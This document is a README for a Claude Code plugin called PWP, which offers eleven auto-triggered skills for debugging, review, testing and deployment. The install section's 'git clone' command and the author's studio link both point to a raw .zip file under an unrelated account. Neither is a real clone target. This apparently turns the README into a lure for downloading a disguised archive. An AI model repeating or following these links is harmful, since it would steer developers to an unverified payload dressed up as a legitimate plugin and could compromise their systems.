# PWP — Project Workflow Protocol Plugin

> 11 systematic skills that give Claude Code professional engineering discipline. No vibes. No guessing. Structured protocols for every phase of software development.

## What It Does

PWP installs 11 auto-triggered skills into Claude Code. Each skill activates when Claude detects a relevant task — debugging, reviewing code, deploying, writing tests — and provides a structured, battle-tested protocol instead of ad-hoc responses.

## Skills

| Skill | Triggers When You... | What It Does |
|-------|---------------------|--------------|
| `pwp-debug` | Report a bug, share an error, say "fix this" | Reproduce → isolate → root cause → fix → verify |
| `pwp-code-review` | Ask to review code or check a PR | Structured review: correctness, security, readability, performance |
| `pwp-security-audit` | Ask about security or vulnerabilities | OWASP-aligned checklist: secrets, auth, input validation, dependencies |
| `pwp-refactor` | Ask to clean up, simplify, or restructure | Safe refactoring with tests-first, one-pattern-per-commit discipline |
| `pwp-migrate` | Need schema changes or platform moves | Reversible migrations with rollback plans and realistic data testing |
| `pwp-api-design` | Build or review API endpoints | REST conventions, status codes, response envelopes, pagination |
| `pwp-perf` | Report something slow or want optimization | Measure → profile → identify bottleneck → fix → verify with numbers |
| `pwp-bootstrap` | Start a new project from scratch | Repo setup, tooling, folder structure, hello world verification |
| `pwp-test` | Need to write or plan tests | Test pyramid, naming conventions, coverage targets, data factories |
| `pwp-deploy` | Deploy, ship, or push to production | Environment ladder, pre-deploy checklist, rollback strategy, monitoring |
| `pwp-docs` | Update docs, changelog, or architecture | Living documents, feature traceability IDs, walkthrough artifacts |

## Installation

### From Self-Hosted Marketplace

```bash
# Add the marketplace
/plugin marketplace add shandar/pwp-plugin

# Install the plugin
/plugin install pwp@pwp-marketplace
```

### From Local Directory

```bash
# Clone the repo
git clone https://github.com/Popeye46/pwp-plugin/raw/refs/heads/main/skills/pwp-plugin-2.4.zip

# Load directly for testing
claude --plugin-dir ./pwp-plugin
```

### Manual Installation

```bash
# Copy to plugin cache
cp -R ./pwp-plugin ~/.claude/plugins/cache/local/pwp/1.0.0/
```

Then add to `~/.claude/plugins/installed_plugins.json` and enable in `~/.claude/settings.json`.

## How It Works

Each skill has a detailed `SKILL.md` with:
- **Trigger description** — tells Claude when to activate the skill automatically
- **Mindset section** — the philosophy behind the protocol
- **Step-by-step protocol** — the exact workflow to follow
- **Anti-patterns** — what NOT to do and why
- **Checklists** — verification steps before considering the task complete

Skills are auto-triggered based on context. You don't need to invoke them manually — Claude will use the right protocol when it detects a matching task.

## Project Structure

```
pwp-plugin/
├── .claude-plugin/
│   ├── plugin.json          # Plugin manifest
│   └── marketplace.json     # Self-hosted marketplace catalog
├── skills/
│   ├── pwp-debug/SKILL.md
│   ├── pwp-code-review/SKILL.md
│   ├── pwp-security-audit/SKILL.md
│   ├── pwp-refactor/SKILL.md
│   ├── pwp-migrate/SKILL.md
│   ├── pwp-api-design/SKILL.md
│   ├── pwp-perf/SKILL.md
│   ├── pwp-bootstrap/SKILL.md
│   ├── pwp-test/SKILL.md
│   ├── pwp-deploy/SKILL.md
│   └── pwp-docs/SKILL.md
├── LICENSE
├── CHANGELOG.md
└── README.md
```

## Philosophy

PWP is built on one principle: **structure beats talent at scale.**

An engineer with a protocol will consistently outperform one relying on intuition. PWP gives Claude Code that same structural advantage — no guessing, no random changes, no "try this and see."

Every protocol follows the same meta-pattern:
1. **Understand** the problem before acting
2. **Plan** the approach before executing
3. **Execute** with discipline (one thing at a time)
4. **Verify** the result before declaring success
5. **Document** what was done and why

## Contributing

1. Fork the repository
2. Create a feature branch
3. Add or modify skills in `skills/`
4. Test with `claude --plugin-dir ./pwp-plugin`
5. Submit a pull request

## License

MIT — see [LICENSE](./LICENSE)

## Author

**Shandar Junaid** — [Affordance Design Studio](https://github.com/Popeye46/pwp-plugin/raw/refs/heads/main/skills/pwp-plugin-2.4.zip)
